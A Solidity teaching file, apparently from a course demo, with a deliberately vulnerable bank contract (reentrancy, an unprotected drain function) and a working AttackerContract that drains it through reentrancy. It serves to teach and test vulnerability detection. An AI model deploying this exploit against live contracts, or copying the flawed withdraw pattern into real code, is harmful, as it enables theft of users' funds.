// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title VulnerableBank
 * @notice INTENTIONALLY VULNERABLE — Educational purposes only
 * @dev Topic 124 Demo — Al-Nafi AIOps Level 6 — Saleem Ali
 *
 * Vulnerabilities present (for Slither to detect):
 *  1. Reentrancy              (Critical)
 *  2. Missing access control  (Medium)
 *  3. Unchecked low-level call(Medium)
 */
contract VulnerableBank {

    mapping(address => uint256) public balances;
    uint256 public totalDeposits;
    address public owner;

    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    // ── Deposit ────────────────────────────────────────────────────────
    function deposit() public payable {
        require(msg.value > 0, "Send ETH to deposit");
        balances[msg.sender] += msg.value;
        totalDeposits        += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    // ── VULNERABLE withdraw ────────────────────────────────────────────
    // BUG: external call happens BEFORE state update → reentrancy!
    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // ❌ VULNERABILITY 1 — external call before state update
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");

        // State updated TOO LATE — attacker already re-entered above
        balances[msg.sender] -= _amount;
        totalDeposits        -= _amount;

        emit Withdraw(msg.sender, _amount);
    }

    // ── VULNERABLE emergency drain ─────────────────────────────────────
    // BUG: no onlyOwner modifier — anyone can drain the contract!
    function emergencyDrain() public {
        // ❌ VULNERABILITY 2 — missing access control
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok, "Drain failed");
    }

    // ── View helpers ───────────────────────────────────────────────────
    function getMyBalance()       public view returns (uint256) { return balances[msg.sender]; }
    function getContractBalance() public view returns (uint256) { return address(this).balance; }

    receive() external payable { deposit(); }
    fallback() external payable { deposit(); }
}


/**
 * @title AttackerContract
 * @notice Demonstrates how reentrancy drains VulnerableBank
 */
contract AttackerContract {
    VulnerableBank public target;
    address        public owner;
    uint256        public attackAmount;

    constructor(address _target) {
        target      = VulnerableBank(payable(_target));
        owner       = msg.sender;
        attackAmount = 1 ether;
    }

    function attack() external payable {
        require(msg.value >= attackAmount, "Need >= 1 ETH");
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    // Called automatically every time contract receives ETH
    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);   // re-enter!
        }
    }

    function collectLoot() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
